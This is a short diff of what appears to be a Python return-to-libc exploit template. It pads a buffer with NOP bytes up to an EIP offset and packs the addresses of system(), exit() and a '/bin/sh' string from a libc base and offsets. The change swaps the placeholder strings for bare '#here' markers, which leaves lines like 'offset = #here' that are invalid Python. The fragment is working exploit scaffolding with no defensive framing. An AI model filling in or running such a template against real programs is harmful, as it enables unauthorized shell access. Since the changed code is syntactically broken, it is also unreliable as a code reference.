@@ -13,13 +13,13 @@ print("*********************************************")
 print()
 print()
 
-offset = "Enter your EIP offset"
+offset = #here
 junk = b"\x90"*offset
 
-base_libc_addr = "Enter your address base_libc_addr in HEX format"
-system_addr_off = "Enter your system_addr_off in HEX format"
-exit_addr_off = "Enter your exit_addr_off in HEX format"
-bin_sh_addr_off = "Enter your bin_sh_addr_off in HEX format"
+base_libc_addr = #here
+system_addr_off = #here
+exit_addr_off = #here
+bin_sh_addr_off = #here
 
 system_addr = pack("<L", base_libc_addr + system_addr_off)
 exit_addr = pack("<L", base_libc_addr + exit_addr_off)
